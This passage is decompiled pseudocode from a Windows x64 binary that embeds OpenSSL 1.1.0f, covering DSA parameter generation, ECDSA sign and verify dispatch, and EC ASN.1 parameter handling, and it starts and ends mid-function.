  int *v51; // [rsp+40h] [rbp-158h]
  __int64 *v52; // [rsp+48h] [rbp-150h]
  unsigned int v53; // [rsp+50h] [rbp-148h]
  int v54; // [rsp+54h] [rbp-144h]
  size_t v55; // [rsp+60h] [rbp-138h]
  int *v56; // [rsp+68h] [rbp-130h]
  __int64 **v57; // [rsp+70h] [rbp-128h]
  int v58; // [rsp+78h] [rbp-120h]
  void *v59; // [rsp+80h] [rbp-118h]
  __int64 **v60; // [rsp+90h] [rbp-108h]
  _DWORD *v61; // [rsp+98h] [rbp-100h]
  _QWORD *v64; // [rsp+B8h] [rbp-E0h]
  __int64 v65; // [rsp+C8h] [rbp-D0h]
  __int64 v66; // [rsp+D0h] [rbp-C8h]
  _QWORD *v67; // [rsp+D8h] [rbp-C0h]
  _QWORD *v68; // [rsp+E0h] [rbp-B8h]
  unsigned __int64 v69; // [rsp+E8h] [rbp-B0h]
  int *v70; // [rsp+F8h] [rbp-A0h]
  char v71[64]; // [rsp+100h] [rbp-98h] BYREF

  v11 = Size;
  v12 = (__int64)a4;
  v70 = a10;
  v14 = 0i64;
  v15 = 0;
  v16 = a3 >> 3;
  v17 = 0i64;
  v59 = 0i64;
  v61 = 0i64;
  v53 = 0;
  v56 = a4;
  v55 = Size;
  v69 = a3 >> 3;
  v50 = (__int64 *)sub_14006DFD0();
  v18 = v50;
  v58 = 2;
  if ( v50 )
  {
    if ( !v12 )
    {
      if ( a3 == 160 )
      {
        v19 = (int *)sub_14005BAC0();
      }
      else if ( a3 == 224 )
      {
        v19 = (int *)sub_14005BAD0();
      }
      else
      {
        v19 = (int *)sub_14005BAE0();
      }
      v12 = (__int64)v19;
      v56 = v19;
    }
    v20 = (int)sub_1400253D0(v12);
    v54 = v20;
    if ( *(_QWORD *)(a1 + 8) && *(_QWORD *)(a1 + 16) && a7 < 0 )
    {
      v22 = a5;
    }
    else
    {
      if ( !Size )
      {
        v11 = v20;
        v55 = v20;
      }
      v14 = (char *)sub_14001D8E0(v11);
      v21 = a8;
      if ( !a8 )
        v21 = sub_14001D8E0(v11);
      v59 = v21;
      if ( !v14 || !v21 )
        goto LABEL_119;
      v22 = a5;
      if ( a5 )
        memmove(v14, a5, v11);
    }
    v51 = (int *)sub_140027CD0();
    v17 = (__int64)v51;
    if ( v51 )
    {
      v61 = sub_14003C400();
      if ( v61 )
      {
        sub_140027D40(v51);
        v23 = sub_140027C40(v51);
        v64 = sub_140027C40(v51);
        v24 = sub_140027C40(v51);
        v66 = (__int64)v24;
        v68 = sub_140027C40(v51);
        v67 = sub_140027C40(v51);
        v52 = sub_140027C40(v51);
        if ( v52 )
        {
          v60 = *(__int64 ***)(a1 + 8);
          if ( v60 )
          {
            v57 = *(__int64 ***)(a1 + 16);
            if ( v57 )
            {
              if ( a7 >= 0 )
                memmove(v59, v14, v11);
              v25 = a11;
LABEL_29:
              v26 = sub_140027650();
              v17 = (__int64)v51;
              if ( !(unsigned int)sub_140041AC0((__int64)v52, (__int64)v60, (__int64)v26)
                || !(unsigned int)sub_140041D70(v23, 0i64, (__int64)v52, (__int64)v57, v51) )
              {
                goto LABEL_118;
              }
              if ( a7 >= 0 )
              {
                v58 = 1;
LABEL_85:
                if ( (unsigned int)sub_14003C480((__int64)v61, v60, v51) )
                {
                  LOWORD(v43) = v58;
                  v44 = a7;
LABEL_87:
                  if ( v44 < 0
                    || (v71[0] = v44,
                        v71[1] = BYTE1(v43),
                        v71[2] = v43,
                        (unsigned int)sub_14006DB20((__int64)v50, v56, 0i64))
                    && (unsigned int)sub_14006DD90((__int64)v50)
                    && (unsigned int)sub_14006DD90((__int64)v50)
                    && (unsigned int)sub_14006DD90((__int64)v50)
                    && (unsigned int)sub_14006DA80(v50, (__int64)v71, 0i64)
                    && sub_140026840(v71, v20, (__int64)v52) )
                  {
                    while ( (unsigned int)sub_14007BDF0(
                                            (__int64)v64,
                                            (__int64)v52,
                                            (__int64)v23,
                                            (unsigned __int64)v60,
                                            v51,
                                            (__int64)v61) )
                    {
                      if ( !sub_140027110((__int64)v64) )
                      {
                        if ( !(unsigned int)sub_1400ADDE0(v25, 3u, 1u) )
                          goto LABEL_118;
                        v32 = 1;
                        v46 = *(__int64 ***)(a1 + 8);
                        if ( v60 != v46 )
                        {
                          sub_140026FF0(v46);
                          *(_QWORD *)(a1 + 8) = sub_140026F70((__int64)v60);
                        }
                        v47 = *(__int64 ***)(a1 + 16);
                        if ( v57 != v47 )
                        {
                          sub_140026FF0(v47);
                          *(_QWORD *)(a1 + 16) = sub_140026F70((__int64)v57);
                        }
                        sub_140026FF0(*(_DWORD **)(a1 + 24));
                        v48 = sub_140026F70((__int64)v64);
                        v40 = *(_QWORD *)(a1 + 8) == 0i64;
                        *(_QWORD *)(a1 + 24) = v48;
                        if ( !v40 && *(_QWORD *)(a1 + 16) && v48 )
                        {
                          if ( a9 )
                            *a9 = v15;
                          v18 = v50;
                          if ( v70 )
                            *v70 = v58;
                        }
                        else
                        {
                          v18 = v50;
                          v32 = -1;
                        }
                        goto LABEL_120;
                      }
                      v44 = a7;
                      if ( a7 < 0 )
                      {
                        v45 = sub_140027650();
                        if ( !(unsigned int)sub_140041A10((__int64)v52, (__int64)v52, (__int64)v45) )
                          goto LABEL_118;
                        v44 = a7;
                      }
                      v43 = ++v58;
                      if ( v44 >= 0 )
                      {
                        if ( v43 <= 0xFFFF )
                          goto LABEL_87;
                        goto LABEL_118;
                      }
                    }
                  }
                }
                goto LABEL_118;
              }
              if ( (unsigned int)sub_140027560((__int64)v52, 2i64) )
                goto LABEL_85;
LABEL_118:
              v18 = v50;
              goto LABEL_119;
            }
          }
          v60 = (__int64 **)sub_140027C40(v51);
          v57 = (__int64 **)sub_140027C40(v51);
          v27 = (__int64 *)sub_140027650();
          if ( (unsigned int)sub_140046E40((__int64)v52, v27, (int)a2 - 1) )
          {
            v65 = (int)v16;
LABEL_36:
            while ( 1 )
            {
              v28 = sub_1400ADDE0(a11, 0, v53++);
              if ( !v28 || !v22 && (int)sub_140025460((__int64)v14, v11) <= 0 )
                break;
              if ( !(unsigned int)sub_14006D970((__int64)v14, v11, (__int64)v71, 0i64, v56, 0i64) )
                break;
              v29 = v71;
              v30 = (int)v20 < (int)v16;
              if ( (int)v20 > (int)v16 )
              {
                v29 = &v71[(int)v20 - v65];
                v30 = (int)v20 < (int)v16;
              }
              if ( v30 )
                memset(&v71[(int)v20], 0, (int)v16 - (int)v20);
              *v29 |= 0x80u;
              v29[v65 - 1] |= 1u;
              if ( !sub_140026840(v29, v16, (__int64)v57) )
                break;
              v22 = a5;
              v31 = sub_1400AE180(v57, 50, v51, a5 != 0i64, a11);
              if ( v31 > 0 )
              {
                if ( a8 )
                  memmove(a8, v14, v11);
                v25 = a11;
                if ( (unsigned int)sub_1400ADDE0(a11, 2u, 0) && (unsigned int)sub_1400ADDE0(a11, 3u, 0) )
                {
                  v33 = 8 * v20;
                  v15 = 0;
                  v34 = (a2 - 1) / (unsigned __int64)(8 * (int)v20);
                  while ( !v15 || (unsigned int)sub_1400ADDE0(v25, 0, v15) )
                  {
                    sub_140027560((__int64)v24, 0i64);
                    v35 = 0;
                    if ( (v34 & 0x80000000) == 0i64 )
                    {
                      v36 = v55;
                      v37 = 0;
                      v38 = (int)v55 - 1;
                      while ( 1 )
                      {
                        if ( v38 >= 0 )
                        {
                          v39 = &v14[v38];
                          do
                          {
                            v40 = (*v39)++ == -1;
                            if ( !v40 )
                              break;
                            --v39;
                          }
                          while ( v39 - v14 >= 0 );
                          v36 = v55;
                        }
                        if ( !(unsigned int)sub_14006D970((__int64)v14, v36, (__int64)v71, 0i64, v56, 0i64)
                          || !sub_140026840(v71, v54, (__int64)v23)
                          || !(unsigned int)sub_140046E40((__int64)v23, v23, v37)
                          || !(unsigned int)sub_140041A10(v66, v66, (__int64)v23) )
                        {
                          goto LABEL_117;
                        }
                        v36 = v55;
                        ++v35;
                        v37 += v33;
                        if ( v35 > (int)v34 )
                        {
                          v24 = (_QWORD *)v66;
                          break;
                        }
                      }
                    }
                    if ( !(unsigned int)sub_140027170((__int64)v24, (int)a2 - 1)
                      || !sub_140026E90((__int64)v68, (__int64)v24)
                      || !(unsigned int)sub_140041A10((__int64)v68, (__int64)v68, (__int64)v52)
                      || !(unsigned int)sub_140046FD0((__int64)v23, (__int64)v57) )
                    {
                      goto LABEL_117;
                    }
                    if ( !(unsigned int)sub_140041D70(0i64, (__int64)v67, (__int64)v68, (__int64)v23, v51) )
                      goto LABEL_116;
                    v41 = sub_140027650();
                    if ( !(unsigned int)sub_140041AC0((__int64)v23, (__int64)v67, (__int64)v41)
                      || !(unsigned int)sub_140041AC0((__int64)v60, (__int64)v68, (__int64)v23) )
                    {
                      goto LABEL_116;
                    }
                    v25 = a11;
                    if ( (int)sub_140026AB0((__int64)v60, v52) >= 0 )
                    {
                      v42 = sub_1400AE180(v60, 50, v51, 1, a11);
                      if ( v42 > 0 )
                      {
                        if ( (unsigned int)sub_1400ADDE0(a11, 2u, 1u) )
                        {
                          LODWORD(v20) = v54;
                          goto LABEL_29;
                        }
LABEL_116:
                        v17 = (__int64)v51;
                        goto LABEL_118;
                      }
                      if ( v42 )
                        goto LABEL_116;
                    }
                    if ( (int)++v15 >= 4 * (int)a2 )
                    {
                      v22 = a5;
                      if ( !a5 )
                      {
                        LODWORD(v20) = v54;
                        v11 = v55;
                        LODWORD(v16) = v69;
                        goto LABEL_36;
                      }
                      v32 = 0;
                      sub_140024610(10, 126, 112, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_gen.c", 511);
                      v18 = v50;
                      v17 = (__int64)v51;
                      goto LABEL_120;
                    }
                  }
                }
                break;
              }
              if ( v31 )
                break;
              if ( a5 )
              {
                v32 = 0;
                sub_140024610(10, 126, 113, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_gen.c", 422);
                v17 = (__int64)v51;
                v18 = v50;
                goto LABEL_120;
              }
            }
          }
        }
LABEL_117:
        v17 = (__int64)v51;
        goto LABEL_118;
      }
    }
  }
LABEL_119:
  v32 = -1;
LABEL_120:
  sub_14001D930(v14);
  if ( a8 != v59 )
    sub_14001D930(v59);
  if ( v17 )
    sub_140027B60(v17);
  sub_140027BE0(v17);
  sub_14003C3A0((__int64)v61);
  sub_14006DF90(v18);
  return v32;
}

//----- (0000000140064DE0) ----------------------------------------------------
__int64 __fastcall sub_140064DE0(_QWORD *a1)
{
  __int64 (*v1)(void); // rdx

  v1 = *(__int64 (**)(void))(a1[10] + 88i64);
  if ( v1 )
    return v1();
  else
    return sub_140064E10(a1);
}

//----- (0000000140064E10) ----------------------------------------------------
__int64 __fastcall sub_140064E10(_QWORD *a1)
{
  unsigned int v1; // r14d
  _QWORD *v2; // rsi
  _DWORD *v4; // rbx
  int *v5; // r15
  _DWORD *v6; // rax
  _DWORD *v7; // rbp

  v1 = 0;
  v2 = 0i64;
  v4 = 0i64;
  v5 = (int *)sub_140027CD0();
  if ( v5 )
  {
    v4 = (_DWORD *)a1[5];
    if ( v4 || (v4 = sub_1400273B0()) != 0i64 )
    {
      while ( (unsigned int)sub_140028310((__int64)v4, a1[2]) )
      {
        if ( !sub_140027160((__int64)v4) )
        {
          v2 = (_QWORD *)a1[4];
          if ( v2 || (v2 = sub_140027200()) != 0i64 )
          {
            v6 = sub_140027200();
            v7 = v6;
            if ( v6 )
            {
              sub_140027660((__int64)v6, (__int64)v4, 4);
              if ( (unsigned int)sub_14007BD10(v2, a1[3], (__int64)v7, a1[1], v5) )
              {
                sub_140026FF0(v7);
                a1[5] = v4;
                v1 = 1;
                a1[4] = v2;
              }
              else
              {
                sub_140026FF0(v7);
              }
            }
          }
          break;
        }
      }
    }
  }
  if ( v2 != (_QWORD *)a1[4] )
    sub_140026FF0(v2);
  if ( v4 != (_DWORD *)a1[5] )
    sub_140026FF0(v4);
  sub_140027BE0((__int64)v5);
  return v1;
}

//----- (0000000140064F40) ----------------------------------------------------
__int64 *__fastcall sub_140064F40(
        char *a1,
        unsigned __int64 a2,
        __int64 a3,
        unsigned __int64 a4,
        __int64 a5,
        unsigned __int64 a6,
        int *a7)
{
  size_t v7; // rdi
  __int64 *result; // rax
  __int64 *v10; // rbx
  unsigned __int64 v11; // rsi
  int v12; // ebp
  unsigned int v13; // [rsp+24h] [rbp-B4h]
  char Src[64]; // [rsp+40h] [rbp-98h] BYREF

  v7 = a2;
  v13 = 0;
  if ( a6 > 0x40000000 || a2 > 0x40000000 || a4 > 0x40000000 )
    return 0i64;
  result = (__int64 *)sub_14006DFD0();
  v10 = result;
  if ( result )
  {
    v11 = (int)sub_1400253D0((__int64)a7);
    v12 = 1;
    if ( (unsigned int)sub_14006DB20((__int64)v10, a7, 0i64) )
    {
      while ( (unsigned int)sub_14006DD90((__int64)v10)
           && (unsigned int)sub_14006DD90((__int64)v10)
           && (unsigned int)sub_14006DD90((__int64)v10) )
      {
        if ( v7 < v11 )
        {
          if ( !(unsigned int)sub_14006DA40(v10, (__int64)Src, 0i64) )
            break;
          memmove(a1, Src, v7);
          sub_140023440((__int64)Src, v11);
LABEL_16:
          v13 = 1;
          break;
        }
        if ( !(unsigned int)sub_14006DA40(v10, (__int64)a1, 0i64) )
          break;
        v7 -= v11;
        if ( !v7 )
          goto LABEL_16;
        a1 += v11;
        ++v12;
        if ( !(unsigned int)sub_14006DB20((__int64)v10, a7, 0i64) )
          break;
      }
    }
    sub_14006DF90(v10);
    return (__int64 *)v13;
  }
  return result;
}

//----- (0000000140065140) ----------------------------------------------------
__int64 __fastcall sub_140065140(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 (*v5)(void); // r11

  v5 = *(__int64 (**)(void))(*(_QWORD *)a5 + 96i64);
  if ( v5 )
    return v5();
  sub_140024610(16, 251, 152, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_sign.c", 25);
  return 0i64;
}

//----- (0000000140065190) ----------------------------------------------------
__int64 __fastcall sub_140065190(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 (__fastcall *v6)(__int64, __int64, __int64, __int64); // r11

  v6 = *(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)a6 + 80i64);
  if ( v6 )
    return v6(a1, a2, a3, a4);
  sub_140024610(16, 254, 152, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_sign.c", 41);
  return 0i64;
}

//----- (0000000140065200) ----------------------------------------------------
__int64 __fastcall sub_140065200(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 (*v4)(void); // r10

  v4 = *(__int64 (**)(void))(*(_QWORD *)a4 + 112i64);
  if ( v4 )
    return v4();
  sub_140024610(16, 252, 152, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_vrf.c", 25);
  return 0i64;
}

//----- (0000000140065250) ----------------------------------------------------
__int64 __fastcall sub_140065250(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, __int64 a6)
{
  __int64 (*v6)(void); // r11

  v6 = *(__int64 (**)(void))(*(_QWORD *)a6 + 104i64);
  if ( v6 )
    return v6();
  sub_140024610(16, 253, 152, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_vrf.c", 41);
  return 0i64;
}

//----- (00000001400652A0) ----------------------------------------------------
void *sub_1400652A0()
{
  return &unk_140106160;
}

//----- (00000001400652B0) ----------------------------------------------------
void *sub_1400652B0()
{
  return &unk_140106228;
}

//----- (00000001400652C0) ----------------------------------------------------
void *sub_1400652C0()
{
  return &unk_1401062C0;
}

//----- (00000001400652D0) ----------------------------------------------------
void *sub_1400652D0()
{
  return &unk_140106360;
}

//----- (00000001400652E0) ----------------------------------------------------
void *sub_1400652E0()
{
  return &unk_1401063D0;
}

//----- (00000001400652F0) ----------------------------------------------------
void *sub_1400652F0()
{
  return &unk_1401065E0;
}

//----- (0000000140065300) ----------------------------------------------------
void *sub_140065300()
{
  return &unk_140106550;
}

//----- (0000000140065310) ----------------------------------------------------
void *sub_140065310()
{
  return &unk_140106460;
}

//----- (0000000140065320) ----------------------------------------------------
void __fastcall sub_140065320(__int64 **a1)
{
  if ( a1 )
  {
    sub_140026A10(*a1);
    sub_140026A10(a1[1]);
    sub_14001D930(a1);
  }
}

//----- (0000000140065370) ----------------------------------------------------
void *__fastcall sub_140065370()
{
  int v0; // eax
  void *result; // rax

  result = sub_14001DC20((unsigned int)(v0 - 32));
  if ( !result )
  {
    sub_140024610(16, 265, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 1179);
    return 0i64;
  }
  return result;
}
// 14006538C: variable 'v0' is possibly undefined

//----- (00000001400653D0) ----------------------------------------------------
__int64 __fastcall sub_1400653D0(__int64 a1)
{
  __int64 v2; // rax
  int v3; // eax
  int v4; // eax
  unsigned int v5[2]; // [rsp+20h] [rbp-28h] BYREF
  char *v6; // [rsp+28h] [rbp-20h]
  char v7; // [rsp+50h] [rbp+8h] BYREF

  if ( !a1 )
    return 0i64;
  v2 = sub_14001C740(a1);
  if ( !v2 )
    return 0i64;
  v3 = sub_140021D20(v2);
  if ( !v3 )
    return 0i64;
  v5[1] = 2;
  v7 = -1;
  v5[0] = (v3 + 7) / 8;
  v6 = &v7;
  v4 = sub_140050050(v5, 0i64);
  return sub_140047960(1, 2 * v4, 16);
}

//----- (0000000140065450) ----------------------------------------------------
__int64 __fastcall sub_140065450(__int64 a1)
{
  __int64 v2; // rax
  unsigned int v4; // r8d
  _DWORD *v5; // rax
  int v6; // edx
  __int64 i; // rcx

  v2 = sub_140021BD0(a1);
  if ( (unsigned int)sub_140022000(v2) != 407 )
    return 0i64;
  v4 = 0;
  v5 = (_DWORD *)(a1 + 72);
  v6 = 0;
  for ( i = 0i64; i < 6; ++i )
  {
    if ( !*v5 )
      break;
    ++v6;
    ++v5;
  }
  if ( v6 == 4 )
    return 683i64;
  if ( v6 == 2 )
    return 682;
  return v4;
}

//----- (00000001400654D0) ----------------------------------------------------
__int64 __fastcall sub_1400654D0(__FrameHandler3::TryBlockMap *a1, __int64 a2)
{
  __int64 v4; // rbx
  __int64 v5; // rdx
  struct _xDISPATCHER_CONTEXT *v6; // rbp
  __int16 v7; // r8
  int v8; // eax
  __int64 v9; // rax
  int v10; // ebp
  _DWORD *v11; // rax
  __int64 jumpbuf_sp; // rax
  _DWORD *v13; // rax
  __int64 v14; // rax
  _DWORD *v15; // rax
  int v17; // [rsp+20h] [rbp-18h]
  void *v18; // [rsp+48h] [rbp+10h] BYREF

  v18 = 0i64;
  if ( a2 )
  {
    v4 = a2;
  }
  else
  {
    v4 = sub_140050B70((__int64)&unk_140106550);
    if ( !v4 )
    {
      sub_140024610(16, 261, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 483);
      goto LABEL_26;
    }
  }
  v5 = *(_QWORD *)(v4 + 8);
  *(_DWORD *)v4 = 1;
  if ( !(unsigned int)sub_140066840(a1, v5) )
  {
    sub_140024610(16, 261, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 494);
    goto LABEL_25;
  }
  if ( !(unsigned int)sub_140066500((__int64)a1, *(__int64 **)(v4 + 16)) )
  {
    sub_140024610(16, 261, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 500);
    goto LABEL_25;
  }
  v6 = __FrameHandler3::TryBlockMap::getpDC(a1);
  if ( !v6 )
  {
    v17 = 506;
    v7 = 113;
LABEL_24:
    sub_140024610(16, 261, v7, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", v17);
LABEL_25:
    if ( a2 )
      return 0i64;
LABEL_26:
    sub_140051250((unsigned int *)v4, (__int64)&unk_140106550);
    return 0i64;
  }
  v8 = sub_140021B70((__int64)a1);
  v9 = sub_140028DE0((__int64)a1, v6, v8, &v18, 0i64);
  v10 = v9;
  if ( !v9 )
  {
    sub_140024610(16, 261, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 514);
    goto LABEL_25;
  }
  if ( !*(_QWORD *)(v4 + 24) )
  {
    v11 = sub_14004FEE0();
    *(_QWORD *)(v4 + 24) = v11;
    if ( !v11 )
    {
      sub_14001D930(v18);
      v7 = 65;
      v17 = 519;
      goto LABEL_24;
    }
  }
  sub_1400476D0(*(_QWORD *)(v4 + 24), (__int64)v18, v10);
  jumpbuf_sp = _except_get_jumpbuf_sp(a1);
  if ( !jumpbuf_sp )
  {
    sub_140024610(16, 261, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 527);
    goto LABEL_25;
  }
  v13 = sub_14007DAA0(jumpbuf_sp, *(_DWORD **)(v4 + 32));
  *(_QWORD *)(v4 + 32) = v13;
  if ( !v13 )
  {
    v17 = 532;
LABEL_23:
    v7 = 13;
    goto LABEL_24;
  }
  v14 = sub_14001C740((__int64)a1);
  if ( v14 )
  {
    v15 = sub_14007DAA0(v14, *(_DWORD **)(v4 + 40));
    *(_QWORD *)(v4 + 40) = v15;
    if ( !v15 )
    {
      v17 = 541;
      goto LABEL_23;
    }
  }
  return v4;
}
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);

//----- (00000001400656F0) ----------------------------------------------------
__int64 __fastcall sub_1400656F0(__FrameHandler3::TryBlockMap *a1, __int64 a2)
{
  __int64 v2; // rbx
  unsigned int *v5; // rcx
  unsigned int v6; // eax
  __int64 v7; // rax

  v2 = a2;
  if ( a2 )
  {
    if ( *(_DWORD *)a2 )
    {
      if ( *(_DWORD *)a2 == 1 )
      {
        v5 = *(unsigned int **)(a2 + 8);
        if ( v5 )
          sub_140051250(v5, (__int64)&unk_140106550);
      }
    }
    else
    {
      sub_14003F4D0(*(_QWORD *)(a2 + 8));
    }
  }
  else
  {
    v2 = sub_140050B70((__int64)&unk_1401065E0);
    if ( !v2 )
    {
      sub_140024610(16, 262, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 562);
      return 0i64;
    }
  }
  if ( (unsigned int)sub_140021A00((__int64)a1) )
  {
    v6 = sub_140021B00((__int64)a1);
    if ( !v6 )
    {
LABEL_14:
      sub_140051250((unsigned int *)v2, (__int64)&unk_1401065E0);
      return 0i64;
    }
    *(_DWORD *)v2 = 0;
    v7 = (__int64)sub_14002C0F0(v6);
  }
  else
  {
    *(_DWORD *)v2 = 1;
    v7 = sub_1400654D0(a1, 0i64);
  }
  *(_QWORD *)(v2 + 8) = v7;
  if ( !v7 )
    goto LABEL_14;
  return v2;
}

//----- (00000001400657F0) ----------------------------------------------------
__int64 __fastcall sub_1400657F0(_DWORD *a1, _DWORD *a2)
{
  __int64 v4; // rax
  int v5; // eax

  if ( !a1 )
    return 0i64;
  v4 = sub_140021BD0((__int64)a1);
  if ( (unsigned int)sub_140022000(v4) != 407 || !a1[18] || (v5 = a1[19]) == 0 || a1[20] )
  {
    sub_140024610(16, 194, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 51);
    return 0i64;
  }
  if ( a2 )
    *a2 = v5;
  return 1i64;
}

//----- (0000000140065880) ----------------------------------------------------
__int64 *__fastcall sub_140065880(__int64 a1)
{
  _QWORD *v1; // rax
  __int64 *v2; // rbx
  __int64 *v3; // r15
  _DWORD *v4; // rbp
  _DWORD *v5; // r12
  __int64 *v7; // rax
  __int64 v8; // rdx
  _BYTE *v9; // rcx
  __int64 v10; // r8
  _QWORD *v11; // rsi
  int v12; // eax
  __int64 v13; // r14
  int v14; // r13d
  __int16 v15; // r8
  int v17; // eax
  int *v18; // rcx
  int v19; // eax
  int v20; // esi
  int v21; // edx
  int *v22; // rsi
  int v23; // eax
  int v24; // ecx
  __int64 *v25; // rax
  __int64 v26; // rcx
  __int64 v27; // rax
  void *v28; // rax
  __int64 v29; // rax
  __int64 v30; // rax
  __int16 v31; // r8
  __int64 v32; // rcx
  int v33; // [rsp+20h] [rbp-38h]
  int v34; // [rsp+20h] [rbp-38h]
  int v35; // [rsp+20h] [rbp-38h]

  v1 = *(_QWORD **)(a1 + 8);
  v2 = 0i64;
  v3 = 0i64;
  v4 = 0i64;
  v5 = 0i64;
  if ( !v1 || !*v1 || !v1[1] )
  {
    sub_140024610(16, 263, 115, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 609);
    goto LABEL_12;
  }
  v7 = *(__int64 **)(a1 + 16);
  if ( !v7 || (v8 = *v7) == 0 || (v9 = *(_BYTE **)(v8 + 8)) == 0i64 || (v10 = v7[1]) == 0 || !*(_QWORD *)(v10 + 8) )
  {
    sub_140024610(16, 263, 115, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 617);
    goto LABEL_12;
  }
  v4 = (_DWORD *)sub_140026840(v9, *(_DWORD *)v8, 0i64);
  if ( !v4 )
  {
    v33 = 622;
LABEL_11:
    sub_140024610(16, 263, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", v33);
LABEL_12:
    v11 = 0i64;
    goto LABEL_22;
  }
  v5 = (_DWORD *)sub_140026840(
                   *(_BYTE **)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 8i64),
                   **(_DWORD **)(*(_QWORD *)(a1 + 16) + 8i64),
                   0i64);
  if ( !v5 )
  {
    v33 = 627;
    goto LABEL_11;
  }
  v12 = sub_14002C260(**(_QWORD **)(a1 + 8));
  if ( v12 == 407 )
  {
    v13 = *(_QWORD *)(*(_QWORD *)(a1 + 8) + 8i64);
    v14 = *(_DWORD *)v13;
    if ( *(int *)v13 > 661 )
    {
      sub_140024610(16, 263, 143, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 647);
      goto LABEL_12;
    }
    v2 = (__int64 *)sub_140027200();
    if ( !v2 )
    {
      v34 = 652;
      v15 = 65;
LABEL_20:
      sub_140024610(16, 263, v15, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", v34);
      goto LABEL_21;
    }
    v17 = sub_14002C260(*(_QWORD *)(v13 + 8));
    if ( v17 == 682 )
    {
      v18 = *(int **)(v13 + 16);
      if ( !v18 )
      {
        v34 = 663;
LABEL_27:
        v15 = 115;
        goto LABEL_20;
      }
      v19 = sub_14007D9A0(v18);
      v20 = v19;
      if ( *(_DWORD *)v13 <= v19 || v19 <= 0 )
      {
        sub_140024610(16, 263, 137, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 671);
        goto LABEL_21;
      }
      if ( !(unsigned int)sub_140027480((__int64)v2, *(_DWORD *)v13) )
      {
LABEL_21:
        v11 = 0i64;
        goto LABEL_22;
      }
      v21 = v20;
    }
    else
    {
      if ( v17 != 683 )
      {
        if ( v17 == 681 )
          sub_140024610(16, 263, 126, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 711);
        else
          sub_140024610(16, 263, 115, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 715);
        goto LABEL_21;
      }
      v22 = *(int **)(v13 + 16);
      if ( !v22 )
      {
        v34 = 687;
        goto LABEL_27;
      }
      v23 = v22[2];
      if ( *(_DWORD *)v13 <= v23 || (v24 = v22[1], v23 <= v24) || v24 <= *v22 || *v22 <= 0 )
      {
        sub_140024610(16, 263, 132, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 695);
        goto LABEL_21;
      }
      if ( !(unsigned int)sub_140027480((__int64)v2, *(_DWORD *)v13)
        || !(unsigned int)sub_140027480((__int64)v2, *v22)
        || !(unsigned int)sub_140027480((__int64)v2, v22[1]) )
      {
        goto LABEL_21;
      }
      v21 = v22[2];
    }
    if ( !(unsigned int)sub_140027480((__int64)v2, v21) || !(unsigned int)sub_140027480((__int64)v2, 0) )
      goto LABEL_21;
    v25 = sub_140044720();
  }
  else
  {
    if ( v12 != 406 )
    {
      sub_140024610(16, 263, 103, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 750);
      goto LABEL_12;
    }
    v26 = *(_QWORD *)(*(_QWORD *)(a1 + 8) + 8i64);
    if ( !v26 )
    {
      sub_140024610(16, 263, 115, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 727);
      goto LABEL_12;
    }
    v27 = sub_14007DA80(v26, 0i64);
    v2 = (__int64 *)v27;
    if ( !v27 )
    {
      sub_140024610(16, 263, 13, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 732);
      goto LABEL_21;
    }
    if ( sub_1400270E0(v27) || sub_140027160((__int64)v2) )
    {
      sub_140024610(16, 263, 103, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 737);
      goto LABEL_21;
    }
    v14 = sub_140027260((__int64)v2);
    if ( v14 > 661 )
    {
      sub_140024610(16, 263, 143, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 743);
      goto LABEL_21;
    }
    v25 = sub_1400447B0(v2);
  }
  v3 = v25;
  if ( !v25 )
  {
    sub_140024610(16, 263, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_asn1.c", 755);
    v11 = 0i64;
    goto LABEL_22;
  }
  if ( *(_QWORD *)(*(_QWORD *)(a1 + 16) + 16i64) )
  {
    sub_14001D930((void *)v25[6]);
    v28 = sub_14001D8E0(**(int **)(*(_QWORD *)(a1 + 16) + 16i64));
